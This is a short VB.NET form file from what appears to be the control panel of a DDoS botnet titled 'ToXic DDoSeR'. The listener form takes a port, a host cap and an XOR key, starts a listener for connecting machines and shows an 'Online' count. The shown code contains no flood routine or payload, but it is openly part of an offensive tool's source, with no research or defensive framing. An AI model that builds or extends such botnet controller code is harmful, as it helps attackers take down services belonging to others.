﻿Public Class frmListen
    Private Sub frmListen_Load(sender As Object, e As EventArgs) Handles MyBase.Load

    End Sub

    Private Sub chkDisplay_CheckedChanged(sender As Object, e As EventArgs) Handles chkDisplay.CheckedChanged
        If chkDisplay.Checked = True Then
            txtPassword.UseSystemPasswordChar = False
        Else
            txtPassword.UseSystemPasswordChar = True
        End If
    End Sub

    Private Sub btnCtrl_Click(sender As Object, e As EventArgs) Handles btnCtrl.Click
        If Not String.IsNullOrEmpty(txtPassword.Text) Then
            frmMain.lport = numPort.Value
            frmMain.host_cap = numLimit.Value
            frmMain.xor_key = txtPassword.Text

            frmMain._active = True
            frmMain.Text = "ToXic DDoSeR  |  Port: " & numPort.Value.ToString & "  |  Online: 0"
            frmMain._begin()

            frmMain.tabEnable.Enabled = False
            frmMain.tabDisable.Enabled = True

            Me.Close()
        End If
    End Sub
End Class